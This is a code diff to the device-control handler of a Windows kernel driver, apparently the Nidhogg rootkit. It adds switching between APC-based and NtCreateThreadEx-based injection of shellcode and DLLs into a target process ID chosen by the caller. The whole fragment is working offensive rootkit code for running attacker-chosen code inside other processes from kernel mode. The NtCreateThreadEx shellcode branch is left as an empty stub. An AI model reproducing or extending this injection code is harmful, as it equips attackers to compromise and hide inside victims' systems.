@@ -1038,17 +1038,27 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 
 		auto data = (ShellcodeInformation*)Irp->AssociatedIrp.SystemBuffer;
 
-		if (data->Pid <= 0 || data->Pid == SYSTEM_PROCESS_PID || !data->Shellcode || data->ShellcodeSize <= 0) {
+		if (data->Pid <= 0 || data->Pid == SYSTEM_PROCESS_PID || !data->Shellcode || data->ShellcodeSize <= 0 || (data->Type != APCInjection && data->Type != NtCreateThreadExInjection)) {
 			status = STATUS_INVALID_PARAMETER;
 			break;
 		}
 
-		if (!NT_SUCCESS(InjectShellcode(data))) {
-			KdPrint((DRIVER_PREFIX "Failed to inject shellcode (0x%08X)\n", status));
+		switch (data->Type) {
+		case APCInjection: {
+			status = InjectShellcodeAPC(data);
 			break;
 		}
+		case NtCreateThreadExInjection: {
+			break;
+		}
+		}
 
-		KdPrint((DRIVER_PREFIX "Shellcode injected successfully.\n"));
+		if (NT_SUCCESS(status))
+			KdPrint((DRIVER_PREFIX "Shellcode injected successfully.\n"));
+		else
+			KdPrint((DRIVER_PREFIX "Failed to inject shellcode (0x%08X)\n", status));
+
+		len += sizeof(ShellcodeInformation);
 		break;
 	}
 
@@ -1068,17 +1078,28 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 
 		auto data = (DllInformation*)Irp->AssociatedIrp.SystemBuffer;
 
-		if (data->Pid <= 0 || data->Pid == SYSTEM_PROCESS_PID || !data->DllPath) {
+		if (data->Pid <= 0 || data->Pid == SYSTEM_PROCESS_PID || !data->DllPath || (data->Type != APCInjection && data->Type != NtCreateThreadExInjection)) {
 			status = STATUS_INVALID_PARAMETER;
 			break;
 		}
 
-		if (!NT_SUCCESS(InjectDll(data))) {
-			KdPrint((DRIVER_PREFIX "Failed to inject DLL (0x%08X)\n", status));
+		switch (data->Type) {
+		case APCInjection: {
+			status = InjectDllAPC(data);
 			break;
 		}
+		case NtCreateThreadExInjection: {
+			status = InjectDllThread(data);
+			break;
+		}
+		}
+		
+		if (NT_SUCCESS(status))
+			KdPrint((DRIVER_PREFIX "DLL injected successfully.\n"));
+		else
+			KdPrint((DRIVER_PREFIX "Failed to inject DLL (0x%08X)\n", status));
 
-		KdPrint((DRIVER_PREFIX "DLL injected successfully.\n"));
+		len += sizeof(DllInformation);
 		break;
 	}
 
